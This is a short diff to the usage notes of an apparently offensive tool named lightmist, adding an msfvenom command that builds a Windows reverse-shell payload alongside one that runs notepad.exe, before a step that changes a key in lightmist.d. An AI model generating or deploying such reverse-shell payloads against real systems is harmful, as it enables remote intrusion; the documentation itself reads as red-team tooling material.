@@ -14,6 +14,10 @@ Usage
 
     $ msfvenom -p windows/exec CMD=notepad.exe > payload
 
+    or
+
+    $ msfvenom -p windows/shell_reverse_tcp > payload
+
 2) Modify the key in lightmist.d
 
 .. code:: bash
